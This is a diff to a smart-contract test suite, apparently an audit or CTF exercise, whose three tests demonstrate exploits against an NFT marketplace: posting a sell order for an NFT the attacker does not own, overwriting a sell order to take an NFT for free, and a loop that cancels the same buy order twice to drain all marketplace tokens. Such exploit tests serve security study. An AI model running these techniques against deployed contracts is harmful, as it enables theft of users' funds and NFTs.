@@ -33,7 +33,7 @@ describe('[NFTMarketplace] Exploits', function() {
 		this.attackerInstance = await this.marketplace.connect(attacker);
 	});
 
-	it('[postSellOrder] No validation that the poster of the sell order is the owner of the NFT', async function() {
+	it('[Exploit #1] No validation that the poster of the sell order is the owner of the NFT', async function() {
 		let nftId = 0;
 		let attackerFunds = ethers.utils.parseEther('1');
 
@@ -55,7 +55,7 @@ describe('[NFTMarketplace] Exploits', function() {
 		).to.be.equal(attacker.address); // Attacker is now the owner of the NFT
 	});
 
-	it('[cancelSellOrder] Overwriting of a sell order leads to exfiltration of the NFT', async function() {
+	it('[Exploit #2] Overwriting of a sell order leads to exfiltration of the NFT', async function() {
 		let nftId = 0;
 		let sellAmount = ethers.utils.parseEther('1000');
 
@@ -72,7 +72,7 @@ describe('[NFTMarketplace] Exploits', function() {
 		).to.be.equal(attacker.address); // Attacker is now the owner of the NFT for free !
 	});
 
-	it ('[decreaseBuyOrder] Wrong check leads to siphoning of funds', async function() {
+	it ('[Exploit #3] Wrong check leads to siphoning of funds', async function() {
 		let marketplaceFunds = ethers.utils.parseEther('100000');
 		let attackerFunds = ethers.utils.parseEther('1');
 
@@ -86,31 +86,30 @@ describe('[NFTMarketplace] Exploits', function() {
 		let attackerBalance = attackerFunds;
 		let marketplaceBalance = marketplaceFunds;
 		
-		// Last order amount can't be decreased if it's equal to 1 since the decreaseAmount has to be strictly less and the function doesn't allow for a 0 value decrease
-		while (marketplaceBalance.gt(1)){
+		while (marketplaceBalance.gt(0)){
 			// Increase the order amount every time until the attacker has enough to withdraw all remaining tokens
 			let orderAmount = (attackerBalance.gt(marketplaceBalance) ? marketplaceBalance : attackerBalance);
 			
-			// attacker posts a buy order for its NFT (#3) using all its tokens
+			// attacker increases the buy order for its NFT (#3) by using all its tokens each time, speeding up the process
 			let tx = await (await this.attackerInstance.postBuyOrder(3, orderAmount)).wait();
 			const {owner, orderId, nftId, erc20Amount} = tx.events.find(event => event.event == "BuyOrderListed").args;
 
 			// attacker immediately cancels the order, getting the tokens refunded by the marketplace (no profit yet)
 			await this.attackerInstance.cancelBuyOrder(orderId);
+			// cancelling a second time should not be possible but the bug allows it, effectively giving the refund indefinitely
+			await this.attackerInstance.cancelBuyOrder(orderId);
 			
-			// attacker gets token from the marketplace for decreasing his cancelled order ! (nb: strict equality requires a smaller amount than original order for 'decreaseAmount')
-			await this.attackerInstance.decreaseBuyOrder(orderId, orderAmount.sub(1));
 			attackerBalance = await this.token.balanceOf(attacker.address);
 			marketplaceBalance = await this.token.balanceOf(this.marketplace.address);
-			// console.log('[decreaseBuyOrder] Attacker balance:', ethers.utils.formatEther(attackerBalance), ' | Marketplace funds:', ethers.utils.formatEther(marketplaceBalance));
+			//console.log('[Exploit #3] Attacker balance:', ethers.utils.formatEther(attackerBalance), ' | Marketplace funds:', ethers.utils.formatEther(marketplaceBalance));
 		}
 
 		expect(
 			await this.token.balanceOf(this.marketplace.address)
-		).to.be.eq(1); // Marketplace has been (almost) emptied
+		).to.be.eq(0); // Marketplace has been emptied of tokens
 
 		expect(
 			await this.token.balanceOf(attacker.address)
-		).to.be.eq(marketplaceFunds.add(attackerFunds).sub(1)); // Attacker has (almost) all the tokens + got his original funds back ;)
+		).to.be.eq(marketplaceFunds.add(attackerFunds)); // Attacker has all the tokens + got his original funds back ;)
 	});
 });
